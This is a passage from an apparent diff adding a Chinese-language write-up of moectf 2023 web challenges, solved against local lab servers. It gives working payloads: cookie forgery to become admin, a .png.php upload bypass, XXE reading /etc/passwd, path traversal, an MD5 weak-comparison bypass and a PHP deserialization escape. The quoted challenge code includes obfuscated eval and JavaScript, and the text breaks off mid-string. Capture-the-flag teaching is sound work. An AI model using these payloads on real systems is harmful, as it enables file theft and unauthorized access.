@@ -1,0 +1,678 @@
+<h2 id="web-入门指北"><a href="#web-入门指北" class="headerlink" title="web 入门指北"></a>web 入门指北</h2><pre><code>666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c5131524758316379596c396a61474673624756755a3055684958303d
+这是一串16进制编码，解码得到
+flag=bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0=
+flag的内容解码得到
+moectf{w3lCome_To_moeCTF_W2b_challengE!!}
+</code></pre>
+<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>使用Postman完成以下操作：</p>
+<p>(Key:Value)</p>
+<p>Params中设置UwU:u<br>Body中设置form-data Luv:u<br>右上角cookie打开后修改guest为admin<br>设置Headers中<br>X-Forwarded-For:127.0.0.1<br>再设置一个新的User-Agent:MoeBrowser</p>
+<p>至此完成所有任务了</p>
+<h2 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h2><p>F12查看页面源码，找到撤回处即可找到flag</p>
+<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>by koito</p>
+<pre><code class="python">from requests import *
+api_base = &quot;http://localhost:8000/&quot;
+
+get(api_base+&quot;status&quot;).json()
+</code></pre>
+<pre><code>{&#39;error&#39;: &#39;ok&#39;, &#39;data&#39;: {&#39;status&#39;: &#39;everything is ok&#39;}}
+</code></pre>
+<p>首先不知道用户名和密码，但是有个<code>register</code>接口，那就注册一个，然后再尝试登录</p>
+<pre><code class="python">resp = post(api_base+&quot;register&quot;,json={&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;&quot;})
+resp.cookies.items(), resp.json()
+</code></pre>
+<pre><code>([], {&#39;error&#39;: &#39;ok&#39;, &#39;data&#39;: {&#39;status&#39;: &#39;ok&#39;}})
+</code></pre>
+<pre><code class="python">resp = post(api_base+&quot;login&quot;,json={&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;&quot;})
+resp.cookies.items(), resp.json()
+</code></pre>
+<pre><code>([(&#39;token&#39;,
+   &#39;eyJ1c2VybmFtZSI6ICIxIiwgInBhc3N3b3JkIjogIiIsICJyb2xlIjogInVzZXIifQ==&#39;)],
+ {&#39;error&#39;: &#39;ok&#39;, &#39;data&#39;: {&#39;status&#39;: &#39;ok&#39;}})
+</code></pre>
+<p>这个token一眼base64,解个码试试看</p>
+<pre><code class="json">{&quot;username&quot;: &quot;1&quot;, &quot;password&quot;: &quot;&quot;, &quot;role&quot;: &quot;user&quot;}
+</code></pre>
+<p>把role改成admin,再试一次</p>
+<pre><code class="python">from base64 import *
+get(api_base+&quot;flag&quot;,cookies={
+    &quot;token&quot;:b64encode(b&#39;{&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;&quot;,&quot;role&quot;:&quot;admin&quot;}&#39;).decode()
+}).json()
+</code></pre>
+<pre><code>{&#39;error&#39;: &#39;ok&#39;,
+ &#39;data&#39;: {&#39;flag&#39;: &#39;moectf{cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro}&#39;}}
+</code></pre>
+<h2 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h2><p>写脚本完成任务（实际上允许的时间间隔是5s）<br>这里使用的是油猴脚本</p>
+<pre><code class="javascript">// ==UserScript==
+// @name         moe2023 gasgasgas Exp
+// @namespace    http://tampermonkey.net/
+// @version      0.1
+// @description  try to take over the world!
+// @author       You
+// @match        http://localhost:52142
+// @icon         https://www.google.com/s2/favicons?sz=64&amp;domain=xidian.edu.cn
+// @grant        none
+// ==/UserScript==
+
+(function() {
+    &#39;use strict&#39;;
+    var hint = document.getElementById(&quot;info&quot;).textContent;
+    if(!hint){
+        return;
+    }
+    console.log(hint);
+
+    var steeringControlSelect = document.getElementById(&quot;steering_control&quot;);
+    var throttleSelect = document.getElementById(&quot;throttle&quot;);
+    var driverInput = document.getElementById(&quot;driver&quot;);
+    driverInput.value = &quot;hacker&quot;;
+
+    if (hint.includes(&quot;弯道向右&quot;)) {
+        steeringControlSelect.value = &quot;-1&quot;;
+    } else if (hint.includes(&quot;弯道向左&quot;)) {
+        steeringControlSelect.value = &quot;1&quot;;
+    } else {
+        steeringControlSelect.value = &quot;0&quot;;
+    }
+
+    if (hint.includes(&quot;抓地力太小了&quot;)) {
+        throttleSelect.value = &quot;0&quot;;
+    } else if (hint.includes(&quot;抓地力太大了&quot;)) {
+        throttleSelect.value = &quot;2&quot;;
+    } else {
+        throttleSelect.value = &quot;1&quot;;
+    }
+})();
+</code></pre>
+<h2 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h2><p>访问uploads.php发现给了源码</p>
+<pre><code class="php">&lt;?php
+$targetDir = &#39;uploads/&#39;;
+$allowedExtensions = [&#39;png&#39;];
+
+
+if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39; &amp;&amp; isset($_FILES[&#39;file&#39;])) {
+    $file = $_FILES[&#39;file&#39;];
+    $tmp_path = $_FILES[&#39;file&#39;][&#39;tmp_name&#39;];
+
+    if ($file[&#39;type&#39;] !== &#39;image/png&#39;) {
+        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件类型不符合要求&#39;]));
+    }
+
+    if (filesize($tmp_path) &gt; 512 * 1024) {
+        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件太大&#39;]));
+    }
+
+    $fileName = $file[&#39;name&#39;];
+    $fileNameParts = explode(&#39;.&#39;, $fileName);
+
+    if (count($fileNameParts) &gt;= 2) {
+        $secondSegment = $fileNameParts[1];
+        if ($secondSegment !== &#39;png&#39;) {
+            die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件后缀不符合要求&#39;]));
+        }
+    } else {
+        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件后缀不符合要求&#39;]));
+    }
+
+    $uploadFilePath = dirname(__FILE__) . &#39;/&#39; . $targetDir . basename($file[&#39;name&#39;]);
+
+    if (move_uploaded_file($tmp_path, $uploadFilePath)) {
+        die(json_encode([&#39;success&#39; =&gt; true, &#39;file_path&#39; =&gt; $uploadFilePath]));
+    } else {
+        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件上传失败&#39;]));
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?&gt;
+</code></pre>
+<p>在这里发现了有问题的后缀过滤代码：</p>
+<pre><code class="php">$fileNameParts = explode(&#39;.&#39;, $fileName);
+
+    if (count($fileNameParts) &gt;= 2) {
+        $secondSegment = $fileNameParts[1];
+        if ($secondSegment !== &#39;png&#39;) {
+            die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件后缀不符合要求&#39;]));
+        }
+    } else {
+        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件后缀不符合要求&#39;]));
+    }
+</code></pre>
+<p>上传image&#x2F;png文件类型、png文件头、后缀为.png.php的文件即可绕过，随后执行php代码</p>
+<h2 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h2><p><strong>代理burp</strong></p>
+<p>很多小伙伴们吐槽burp抓不到本地包</p>
+<p>我使用burp community的时候也出现了这个问题，一顿折腾也解决不了；<br>所以我安装了burp pro并使用其提供的浏览器进行抓包解决了此问题</p>
+<hr>
+<p>抓包发现在浏览汽车的时候传递了xml：</p>
+<pre><code class="http">POST /index.php HTTP/1.1
+Host: 127.0.0.1:7777
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Origin: http://127.0.0.1:7777
+Connection: close
+Referer: http://127.0.0.1:7777/index.php
+Upgrade-Insecure-Requests: 1
+
+xml_content=%3Cxml%3E%3Cname%3EMazda+rx7-FD%3C%2Fname%3E%3C%2Fxml%3E
+</code></pre>
+<p>解urlencode得到</p>
+<pre><code>xml_content=&lt;xml&gt;&lt;name&gt;Mazda+rx7-FD&lt;/name&gt;&lt;/xml&gt;
+</code></pre>
+<p>可以看到传输了xml获取马自达rx7的信息</p>
+<p>尝试利用xxe任意文件读取</p>
+<p><a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files">https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files</a></p>
+<pre><code>Insert the following external entity definition in between the XML declaration and the stockCheck element:
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+Replace the productId number with a reference to the external entity: &amp;xxe;. The response should contain &quot;Invalid product ID:&quot; followed by the contents of the /etc/passwd file.
+</code></pre>
+<p>根据提示flag在根目录下，把这里的payload修改一下</p>
+<pre><code>&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; ]&gt; &lt;xml&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/xml&gt;
+</code></pre>
+<p>编码：</p>
+<pre><code class="http">POST /index.php HTTP/1.1
+Host: 127.0.0.1:7777
+Content-Length: 161
+Cache-Control: max-age=0
+sec-ch-ua: &quot;Not=A?Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;118&quot;
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: &quot;Windows&quot;
+Upgrade-Insecure-Requests: 1
+Origin: http://127.0.0.1:7777
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://127.0.0.1:7777/index.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+xml_content=%3C!DOCTYPE%20test%20%5B%20%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fflag%22%3E%20%5D%3E%20%3Cxml%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Fxml%3E
+</code></pre>
+<p>得到flag</p>
+<h2 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h2><p>根据提示可知要在1000个页面中找到聊天记录里撤回了flag的那一个，自行编写脚本搜索即可</p>
+<p><del>题目源码里可以看见彩蛋是怎么生成的</del></p>
+<h2 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h2><p>此题并不是文件上传漏洞，而是简单的路径穿越和一些php代码审计</p>
+<p>上传一个图片后查看时访问的网址<code>http://127.0.0.1:7777/images.php?name=abc.jpg</code></p>
+<p>尝试访问<code>127.0.0.1:7777/images.php?name=../../../flag</code></p>
+<p>返回了一个无法查看的图片，使用burp抓包</p>
+<pre><code class="http">HTTP/1.1 200 OK
+Date: Fri, 27 Oct 2023 05:05:39 GMT
+Server: Apache/2.4.25 (Debian)
+X-Powered-By: PHP/7.2.19
+Content-Length: 118
+Connection: close
+Content-Type: image/png
+
+hello~
+Flag Not Here~
+Find Somewhere Else~
+
+
+&lt;!--Fl3g_n0t_Here_dont_peek!!!!!.php--&gt;
+
+Not Here~~~~~~~~~~~~~ awa
+</code></pre>
+<p>访问这个<code>Fl3g_n0t_Here_dont_peek!!!!!.php</code></p>
+<pre><code class="php">&lt;?php
+
+highlight_file(__FILE__);
+
+if (isset($_GET[&#39;param1&#39;]) &amp;&amp; isset($_GET[&#39;param2&#39;])) {
+    $param1 = $_GET[&#39;param1&#39;];
+    $param2 = $_GET[&#39;param2&#39;];
+
+    if ($param1 !== $param2) {
+        
+        $md5Param1 = md5($param1);
+        $md5Param2 = md5($param2);
+
+        if ($md5Param1 == $md5Param2) {
+            echo &quot;O.O!! &quot; . getenv(&quot;FLAG&quot;);
+        } else {
+            echo &quot;O.o??&quot;;
+        }
+    } else {
+        echo &quot;o.O?&quot;;
+    }
+} else {
+    echo &quot;O.o?&quot;;
+}
+
+?&gt; O.o?
+</code></pre>
+<p>可以看到此处进行md5弱比较，使用科学计数法绕过得到flag</p>
+<p><strong>?&gt; O.O!!</strong></p>
+<h2 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h2><p>打开看到：</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+
+require_once(&#39;Hanxin.exe.php&#39;);
+
+$Chant = isset($_GET[&#39;chant&#39;]) ? $_GET[&#39;chant&#39;] : &#39;夺命十三枪&#39;;
+
+$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);
+
+$before = serialize($new_visitor);
+$after = Deadly_Thirteen_Spears::Make_a_Move($before);
+echo &#39;Your Movements: &#39; . $after . &#39;&lt;br&gt;&#39;;
+
+try{
+    echo unserialize($after);
+}catch (Exception $e) {
+    echo &quot;Even Caused A Glitch...&quot;;
+}
+?&gt;
+Your Movements: O:34:&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;:2:{s:5:&quot;Chant&quot;;s:15:&quot;夺命十三枪&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;}
+Far away from COOL...
+</code></pre>
+<p>尝试访问<code>Hanxin.exe.php</code></p>
+<p>给出了源码</p>
+<pre><code class="php">&lt;?php
+
+if (basename($_SERVER[&#39;SCRIPT_FILENAME&#39;]) === basename(__FILE__)) {
+    highlight_file(__FILE__);
+}
+
+class Deadly_Thirteen_Spears{
+    private static $Top_Secret_Long_Spear_Techniques_Manual = array(
+        &quot;di_yi_qiang&quot; =&gt; &quot;Lovesickness&quot;,
+        &quot;di_er_qiang&quot; =&gt; &quot;Heartbreak&quot;,
+        &quot;di_san_qiang&quot; =&gt; &quot;Blind_Dragon&quot;,
+        &quot;di_si_qiang&quot; =&gt; &quot;Romantic_charm&quot;,
+        &quot;di_wu_qiang&quot; =&gt; &quot;Peerless&quot;,
+        &quot;di_liu_qiang&quot; =&gt; &quot;White_Dragon&quot;,
+        &quot;di_qi_qiang&quot; =&gt; &quot;Penetrating_Gaze&quot;,
+        &quot;di_ba_qiang&quot; =&gt; &quot;Kunpeng&quot;,
+        &quot;di_jiu_qiang&quot; =&gt; &quot;Night_Parade_of_a_Hundred_Ghosts&quot;,
+        &quot;di_shi_qiang&quot; =&gt; &quot;Overlord&quot;,
+        &quot;di_shi_yi_qiang&quot; =&gt; &quot;Letting_Go&quot;,
+        &quot;di_shi_er_qiang&quot; =&gt; &quot;Decisive_Victory&quot;,
+        &quot;di_shi_san_qiang&quot; =&gt; &quot;Unrepentant_Lethality&quot;
+    );
+
+    public static function Make_a_Move($move){
+        foreach(self::$Top_Secret_Long_Spear_Techniques_Manual as $index =&gt; $movement){
+            $move = str_replace($index, $movement, $move);
+        }
+        return $move;
+    }
+}
+
+class Omg_It_Is_So_Cool_Bring_Me_My_Flag{
+
+    public $Chant = &#39;&#39;;
+    public $Spear_Owner = &#39;Nobody&#39;;
+
+    function __construct($chant){
+        $this-&gt;Chant = $chant;
+        $this-&gt;Spear_Owner = &#39;Nobody&#39;;
+    }
+
+    function __toString(){
+        if($this-&gt;Spear_Owner !== &#39;MaoLei&#39;){
+            return &#39;Far away from COOL...&#39;;
+        }
+        else{
+            return &quot;Omg You&#39;re So COOOOOL!!! &quot; . getenv(&#39;FLAG&#39;);
+        }
+    }
+}
+
+?&gt;
+</code></pre>
+<p>看起来这是夺命十三枪的功法</p>
+<p>本题考查序列化的字符逃逸</p>
+<p>我们需要篡改 <code>Omg_It_Is_So_Cool_Bring_Me_My_Flag</code> 类，将长枪（Spear）交给猫雷（MaoLei）</p>
+<p>php对类的序列化请自行上网查询</p>
+<p>字符串逃逸通过字符替换导致的payload长度变化挤出了序列化的字符串导致可以替换成可控的内容</p>
+<p><code>O:34:&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;:2:{s:5:&quot;Chant&quot;;s:15:&quot;夺命十三枪&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;}</code></p>
+<p>需要将其修改成：</p>
+<p><code>O:34:&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;:2:{s:5:&quot;Chant&quot;;s:15:&quot;夺命十三枪&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;}</code></p>
+<p>payload:</p>
+<p><code>di_jiu_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;}</code></p>
+<p>使用一记【百鬼夜行】还有三招【望穿】连击，持枪者【Nobody】败下阵来，长枪由【MaoLei】接手！</p>
+<p><code>Your Movements: O:34:&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;:2:{s:5:&quot;Chant&quot;;s:80:&quot;Night_Parade_of_a_Hundred_GhostsPenetrating_GazePenetrating_GazePenetrating_Gaze&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;}&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;} Omg You&#39;re So COOOOOL!!!</code></p>
+<p><strong>Omg You’re So COOOOOL!!!</strong></p>
+<h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>by koito (wp by Klutton)</p>
+<p>题目给出附件，有main.py</p>
+<pre><code class="python">from secrets import users, salt
+import hashlib
+import base64
+import json
+import http.server
+
+with open(&quot;flag.txt&quot;,&quot;r&quot;) as f:
+    FLAG = f.read().strip()
+
+def gethash(*items):
+    c = 0
+    for item in items:
+        if item is None:
+            continue
+        c ^= int.from_bytes(hashlib.md5(f&quot;{salt}[{item}]{salt}&quot;.encode()).digest(), &quot;big&quot;) # it looks so complex! but is it safe enough?
+    return hex(c)[2:]
+
+assert &quot;admin&quot; in users
+assert users[&quot;admin&quot;] == &quot;admin&quot;
+
+hashed_users = dict((k,gethash(k,v)) for k,v in users.items())
+
+eval(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,&quot;big&quot;,signed=True).decode().translate({ord(c):None for c in &quot;\x00&quot;})) # what is it?
+    
+def decrypt(data:str):
+        for x in range(5):
+            data = base64.b64encode(data).decode() # ummm...? It looks like it&#39;s just base64 encoding it 5 times? truely?
+        return data
+
+__page__ = base64.b64encode(&quot;PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3